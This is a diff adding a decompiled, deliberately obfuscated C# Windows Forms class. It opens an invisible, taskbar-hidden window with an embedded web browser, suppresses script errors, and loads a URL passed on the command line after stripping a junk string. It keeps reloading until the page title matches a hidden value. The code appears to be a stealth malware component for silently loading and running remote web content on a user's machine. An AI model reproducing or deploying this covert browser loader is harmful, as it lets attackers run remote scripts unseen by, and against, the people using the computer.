@@ -1,0 +1,86 @@
+using System;
+using System.ComponentModel;
+using System.Drawing;
+using System.Windows.Forms;
+
+namespace Wee
+{
+	// Token: 0x02000002 RID: 2
+	public class Zaky : Form
+	{
+		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+		public static string rbabp(string ababp)
+		{
+			return ababp.Replace("babp", "");
+		}
+
+		// Token: 0x06000002 RID: 2 RVA: 0x00002062 File Offset: 0x00000262
+		public Zaky()
+		{
+			base.WindowState = FormWindowState.Maximized;
+			base.Opacity = 0.0;
+			base.ShowInTaskbar = false;
+			this.InitializeComponent();
+			this.hbabpvc.ScriptErrorsSuppressed = true;
+			this.vbabpvbabpn();
+		}
+
+		// Token: 0x06000003 RID: 3 RVA: 0x0000209F File Offset: 0x0000029F
+		private void vbabpvbabpn()
+		{
+			this.hbabpvc.Navigate(Zaky.rbabp(Environment.GetCommandLineArgs()[1]));
+		}
+
+		// Token: 0x06000004 RID: 4 RVA: 0x000020B8 File Offset: 0x000002B8
+		private void volleyed()
+		{
+			if (this.hbabpvc.Document.Title != Zaky.rbabp("babpababp"))
+			{
+				this.vbabpvbabpn();
+			}
+		}
+
+		// Token: 0x06000005 RID: 5 RVA: 0x000020E1 File Offset: 0x000002E1
+		private void cbabpcbabp(object sender, WebBrowserDocumentCompletedEventArgs e)
+		{
+			this.volleyed();
+		}
+
+		// Token: 0x06000006 RID: 6 RVA: 0x000020E9 File Offset: 0x000002E9
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing && this.components != null)
+			{
+				this.components.Dispose();
+			}
+			base.Dispose(disposing);
+		}
+
+		// Token: 0x06000007 RID: 7 RVA: 0x00002108 File Offset: 0x00000308
+		private void InitializeComponent()
+		{
+			this.hbabpvc = new WebBrowser();
+			base.SuspendLayout();
+			this.hbabpvc.Dock = DockStyle.Fill;
+			this.hbabpvc.Location = new Point(0, 0);
+			this.hbabpvc.MinimumSize = new Size(536, 357);
+			this.hbabpvc.Name = "hbabpvc";
+			this.hbabpvc.Size = new Size(536, 357);
+			this.hbabpvc.TabIndex = 0;
+			this.hbabpvc.DocumentCompleted += this.cbabpcbabp;
+			base.AutoScaleDimensions = new SizeF(6f, 13f);
+			base.AutoScaleMode = AutoScaleMode.Font;
+			base.ClientSize = new Size(536, 357);
+			base.Controls.Add(this.hbabpvc);
+			base.Name = "hbabpvc";
+			this.Text = "hbabpvc";
+			base.ResumeLayout(false);
+		}
+
+		// Token: 0x04000001 RID: 1
+		private IContainer components;
+
+		// Token: 0x04000002 RID: 2
+		private WebBrowser hbabpvc;
+	}
+}
